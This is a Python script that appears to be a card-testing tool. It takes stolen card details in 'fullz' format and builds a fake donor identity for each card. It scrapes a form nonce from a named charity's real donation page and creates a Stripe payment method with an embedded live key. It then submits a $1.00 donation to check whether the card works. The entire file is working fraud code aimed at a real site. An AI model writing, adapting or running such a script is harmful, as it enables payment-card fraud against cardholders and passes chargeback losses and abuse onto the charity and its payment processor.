import asyncio
import random
import re
import uuid
from faker import Faker
import requests
import httpx

# Helper to generate fake email
def generate_fake_email():
    domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com']
    name = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(random.randint(5,10)))
    numbers = ''.join(random.choice('1234567890') for _ in range(random.randint(4,5)))
    domain = random.choice(domains)
    return name + numbers + '@' + domain

# Helper to generate random time_on_page
def time_page():
    return ''.join(random.choice('1234567890') for _ in range(6))

# Helper to find substring between two markers
def find_between(s, start, end):
    try:
        start_idx = s.index(start) + len(start)
        end_idx = s.index(end, start_idx)
        return s[start_idx:end_idx]
    except ValueError:
        return None

fake = Faker()

ptime = time_page()
guid = str(uuid.uuid4())
muid = str(uuid.uuid4())
sid = str(uuid.uuid4())


async def create_cvv_charge(fullz, session: httpx.AsyncClient):
    try:
        cc, mes, ano, cvv = fullz.split("|")

        # Generate fresh fake user data for each call
        name = fake.first_name()
        email = generate_fake_email()
        country = fake.country()
        address1 = fake.street_address()
        city = fake.city()
        state = fake.state_abbr()
        zip_code = fake.zipcode_in_state(state)
        phone = "+202" + fake.numerify("#########")
        agent = fake.user_agent()

        # Step 1: GET initial donate page
        headers_initial = {
            'authority': 'hobanz.org.nz',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': agent,
        }

        # Use httpx async session.get
        req1 = await session.get("https://hobanz.org.nz/donate/", headers=headers_initial, timeout=30)
        if req1.status_code != 200:
            return f"Error: Initial donate page request failed with status {req1.status_code}"

        # Safe extraction of nonce and form_id with check
        nonce_list = re.findall(r'name="_charitable_donation_nonce" value="(.*?)"', req1.text)
        form_id_list = re.findall(r'name="charitable_form_id" value="(.*?)"', req1.text)

        if not nonce_list or not form_id_list:
            return "Error: Unable to find nonce or form_id in donate page HTML"

        nonce = nonce_list[0]
        form_id = form_id_list[0]

        # Update cookies to be carried forward
        session.cookies.update(req1.cookies)

        # Step 2: Create Stripe payment method
        headers_stripe = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': agent,
        }

        data_stripe = {
            'type': 'card',
            'billing_details[name]': name,
            'billing_details[email]': email,
            'billing_details[address][city]': city,
            'billing_details[address][country]': 'US',
            'billing_details[address][line1]': address1,
            'billing_details[address][postal_code]': zip_code,
            'billing_details[address][state]': 'Texas',
            'billing_details[phone]': phone,
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_month]': mes,
            'card[exp_year]': ano,
            'guid': guid,
            'muid': muid,
            'sid': sid,
            'referrer': 'https://hobanz.org.nz',
            'time_on_page': ptime,
            'key': 'pk_live_51IK8KECy7gKATUV9t1d0t32P2r0P54BYaeaROb0vL6VdMJzkTpvZc6sIx1W7bKXwEWiH7iQT3gZENUMkYrdvlTte00PxlESxxt'
        }

        req2 = await session.post("https://api.stripe.com/v1/payment_methods", headers=headers_stripe, data=data_stripe, timeout=30)
        json_resp = req2.json()
        payment_method_id = json_resp.get('id', None)

        if not payment_method_id:
            return req2.text  # Return full response text on failure to create payment method

        # Step 3: Confirm donation on hobanz.org.nz
        headers_confirm = {
            'authority': 'hobanz.org.nz',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en-US,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://hobanz.org.nz',
            'referer': 'https://hobanz.org.nz/donate/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': agent,
            'x-requested-with': 'XMLHttpRequest',
        }

        data_confirm = {
            'charitable_form_id': form_id,
            f'{form_id}': '',
            '_charitable_donation_nonce': nonce,
            '_wp_http_referer': '/donate/',
            'campaign_id': '690',
            'description': 'Donate to HOBANZ',
            'ID': '0',
            'recurring_donation': 'once',
            'custom_recurring_donation_amount': '',
            'recurring_donation_period': 'once',
            'donation_amount': 'custom',
            'custom_donation_amount': '1.00',
            'first_name': name,
            'last_name': name,
            'email': email,
            'address': address1,
            'address_2': '',
            'city': city,
            'state': state,
            'postcode': zip_code,
            'country': 'US',
            'phone': phone,
            'gateway': 'stripe',
            'stripe_payment_method': payment_method_id,
            'action': 'make_donation',
            'form_action': 'make_donation',
        }

        req3 = await session.post("https://hobanz.org.nz/wp-admin/admin-ajax.php", headers=headers_confirm, data=data_confirm, timeout=30)
        
        return req3

    except Exception as e:
        return f"Exception: {e}"
